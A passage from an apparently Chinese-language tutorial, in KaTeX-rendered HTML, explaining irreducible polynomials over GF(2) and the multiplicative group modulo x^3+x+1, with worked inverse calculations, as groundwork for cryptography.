class="mclose">)</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>其它</mtext><mn>2</mn><mtext>个多项式</mtext><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo separator="true">,</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mtext>就是不可约多项式了。</mtext></mrow><annotation encoding="application/x-tex">其它2个多项式x^3+x+1,x^3+x^2+1就是不可约多项式了。
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">它</span><span class="mord">2</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">约</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">。</span></span></span></span></span></p>
<p>找到不可约多项式有什么用呢？我们把不可约多项式设置成 “模数”，把各个系数看成集合中的 “元素”，把运算⊙定义成多项式乘法，我们就得到了一个群</p>
<p>举个例子，令</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mtext>，令群包含的元素为</mtext><mrow><mn>001</mn><mo separator="true">,</mo><mn>010</mn><mo separator="true">,</mo><mn>011</mn><mo separator="true">,</mo><mn>100</mn><mo separator="true">,</mo><mn>101</mn><mo separator="true">,</mo><mn>110</mn><mo separator="true">,</mo><mn>111</mn></mrow><mtext>，这</mtext><mn>7</mn><mtext>个元素实际上分别代表</mtext><mn>7</mn><mtext>个多项式</mtext></mrow><annotation encoding="application/x-tex">f(x)=x^3+x+1，令群包含的元素为{001,010,011,100,101,110,111}，这7个元素实际上分别代表7个多项式
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">令</span><span class="mord cjk_fallback">群</span><span class="mord cjk_fallback">包</span><span class="mord cjk_fallback">含</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">为</span><span class="mord"><span class="mord">0</span><span class="mord">0</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span></span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">这</span><span class="mord">7</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">实</span><span class="mord cjk_fallback">际</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">别</span><span class="mord cjk_fallback">代</span><span class="mord cjk_fallback">表</span><span class="mord">7</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>1</mn><mo separator="true">,</mo><mi>x</mi><mo separator="true">,</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo separator="true">,</mo><msup><mi>x</mi><mn>2</mn></msup><mo separator="true">,</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo separator="true">,</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mo separator="true">,</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mspace linebreak="newline"></mspace><mtext>我们知道，多项式乘法仍然满足交换律，单位元还是设置成</mtext><mn>1</mn><mtext>，同时有多项式</mtext><mn>1</mn><mtext>的逆元为</mtext><mn>1</mn><mtext>；多项式</mtext><mi>x</mi><mtext>的逆元为</mtext><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1,x,x+1,x^2,x^2+1,x^2+x,x^2+x+1\\我们知道，多项式乘法仍然满足交换律，单位元还是设置成1，同时有多项式1的逆元为1；多项式x的逆元为x^2+1
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">道</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">仍</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord cjk_fallback">交</span><span class="mord cjk_fallback">换</span><span class="mord cjk_fallback">律</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">单</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">还</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">设</span><span class="mord cjk_fallback">置</span><span class="mord cjk_fallback">成</span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord">1</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">逆</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">为</span><span class="mord">1</span><span class="mord cjk_fallback">；</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">逆</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">为</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></span></p>
<p><img data-src="https://www.zhihu.com/equation?tex=x%28x%5E2%2B1%29%3Dx%5E3%2Bx+%3D+x%5E3%2Bx+%2B1+%2B1+%5Cequiv+1+%5Cbmod+%28x%5E3%2Bx%2B1%29" alt="[公式]" /></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>多项式</mtext><mi>x</mi><mo>+</mo><mn>1</mn><mtext>的逆元为</mtext><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">多项式x+1的逆元为x^2+x
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">逆</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">为</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span></span></p>
<p><img data-src="https://www.zhihu.com/equation?tex=%28x%2B1%29%28x%5E2%2Bx%29%3Dx%5E3%2Bx%5E2%2Bx%5E2%2Bx%3Dx%5E3%2Bx+%5Cequiv+1+%5Cbmod+%28x%5E3%2Bx%2B1%29" alt="[公式]" /></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>多项式</mtext><msup><mi>x</mi><mn>2</mn></msup><mtext>的逆元为</mtext><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">多项式x^2的逆元为x^2+x+1
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">逆</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">为</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></span></p>
<p><img data-src="https://www.zhihu.com/equation?tex=x%5E2%28x%5E2%2Bx%2B1%29%3Dx%5E4%2Bx%5E3%2Bx%5E2%3D%28x%2B1%29%28x%5E3%2Bx%2B1%29%2B1+%5Cequiv+1+%5Cbmod+%28x%5E3%2Bx%2B1%29" alt="[公式]" /></p>
<p>这样一来，{001,010,011,100,101,110,111} 中的每一个元素都能找到逆元。在观察这个集合，一共恰好包含了 2^3-1 个元素。</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>因此数学上一般把这个乘法群写为</mtext><msub><mi>Z</mi><mn>2</mn></msub><mo stretchy="false">[</mo><mi>x</mi><mo stretchy="false">]</mo><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>，或者简写为</mtext><msub><mi>F</mi><mn>2</mn></msub><mn>3</mn><mtext>。模数是一个不可约多项式。</mtext></mrow><annotation encoding="application/x-tex">因此数学上一般把这个乘法群写为Z_{2}[x]/(x^3+x+1)，或者简写为F_{2}3。模数是一个不可约多项式。
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">学</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">般</span><span class="mord cjk_fallback">把</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">群</span><span class="mord cjk_fallback">写</span><span class="mord cjk_fallback">为</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mclose">]</span><span class="mord">/</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">者</span><span class="mord cjk_fallback">简</span><span class="mord cjk_fallback">写</span><span class="mord cjk_fallback">为</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">3</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">约</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">。</span></span></span></span></span></p>
<p>多项式运算和之后的密码学有什么关系？这是许多读者需要思考的问题</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>定义在</mtext><msub><mi>Z</mi><mn>2</mn></msub><mo>=</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">}</mo><mtext>上的多项式有</mtext><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><msup><mi>x</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>x</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow><mi>n</mi></munderover><msub><mi>a</mi><mi>i</mi></msub><msup><mi>x</mi><mi>i</mi></msup><mspace width="2em"/><mi mathvariant="normal">∀</mi><mi>i</mi><mo>∈</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">}</mo><mo separator="true">,</mo><msub><mi>a</mi><mi>i</mi></msub><mo>∈</mo><msub><mi>Z</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">定义在Z_{2}=\lbrace0,1\rbrace上的多项式有f(x)=a_{n-1}x^{n-1}+...+a_{1}x+a_0=\sum_{i=0}^n a_ix^i\qquad\forall i\in\lbrace0,1,2,...,n-1\rbrace,a_i\in Z_2
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">义</span><span class="mord cjk_fallback">在</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">}</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">有</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.072439em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing 